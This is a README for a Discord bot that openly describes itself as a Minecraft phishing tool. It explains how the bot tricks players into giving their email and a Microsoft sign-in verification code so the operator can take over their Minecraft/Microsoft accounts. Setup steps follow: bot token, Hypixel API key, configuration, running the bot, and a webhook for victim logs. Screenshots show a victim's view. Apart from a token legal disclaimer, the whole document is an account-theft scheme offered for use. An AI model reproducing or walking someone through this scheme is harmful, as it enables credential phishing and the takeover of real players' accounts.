# Minecraft-Discord-Phisher-Bot

## Disclaimer
**Usage of Minecraft-Account-Discord-Bot-Phisher for hacking or attacking infrastructures without prior mutual consent can be considered illegal activity. It is the final user's responsibility to obey all applicable local, state, and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program.**

**Note:** Let's not term this <3.

## What Does It Do?
A Minecraft phishing Discord bot is a malicious program designed to deceive players and steal their personal information. To initiate the phishing process, the bot requests the user's email and Minecraft username. It claims that this information is required for verification purposes or to provide the promised rewards or access to a server.

Once the user provides their email and username, the bot will send their email which you will then go to the Microsoft prompt to log in. Because you don’t have the password, you will want to click "other ways to sign in" and then receive a code at whatever email they have saved. Upon entering the verification code into the bot, it grants you access to their Minecraft/Microsoft account.

## How to Run
1. **Download Python**: [Python Download](https://www.python.org/downloads/release/python-31012/)
2. **Create Your Bot**:
    - Make your bot token and give it ALL intents.
3. **Get Your API Key**:
    - Go to [Hypixel Developer Dashboard](https://developer.hypixel.net/dashboard) and copy your API key.
4. **Configure the Bot**:
    - Put the token and API key in `config.py`.
    - Add your Discord ID in `self.admins = [YOUR DISCORD ID]`.
5. **Install Requirements**:
    - Open CMD in the folder and type `pip install -r requirements.txt`.
6. **Run the Bot**:
    - Once finished, run in CMD: `python bot.py`.
7. **Sync Commands**:
    - In your server, type `!sync global`.
8. **Set Up Webhook**:
    - Use `/webhook` and enter where you want your logs to go.

## What It Looks Like
**Logs Interface**<br>
![Logs Interface](https://i.imgur.com/pPeZt8H.png)<br>
**CMD Interface**<br>
![CMD Prompt Interface](https://i.imgur.com/Hp0rAh4.png)<br>
**Victims Pov** (The pfp of my bot will look different to yours)<br>
![Victims Pov](https://i.imgur.com/s91N2fp.png)<br>

